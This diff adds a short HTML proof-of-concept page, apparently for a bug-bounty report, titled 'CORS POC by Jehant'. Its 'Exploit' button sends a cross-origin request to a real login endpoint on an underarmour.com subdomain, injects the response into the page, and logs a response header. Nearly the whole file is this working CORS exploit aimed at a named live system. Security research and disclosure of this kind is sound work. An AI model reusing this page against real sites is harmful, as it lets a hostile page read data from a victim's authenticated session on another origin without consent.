@@ -1,0 +1,29 @@
+<html>
+  <head>
+    <script>
+      function cors(){
+      const client = new XMLHttpRequest();
+      client.open("GET", "https://vtxapp9p.underarmour.com/oseries-auth/login", true);
+      client.send();
+
+      client.onreadystatechange = function () {
+        if(this.readyState == 4 && this.status == 200) {
+         document.getElementById("demo").innerHTML = this.responseText;
+      }
+        if (this.readyState == this.HEADERS_RECEIVED) {
+          const recievedHeader = client.getResponseHeader("Content-Type");
+            console.log(recievedHeader);
+        }
+      };
+    }
+    </script>
+  </head>
+  <body>
+    <center>
+    <h1>CORS POC by Jehant</h1> 
+    <div id="demo">
+      <button type="button" onclick="cors()">Exploit</button>
+      </div>
+    </center>
+  </body>
+</html>
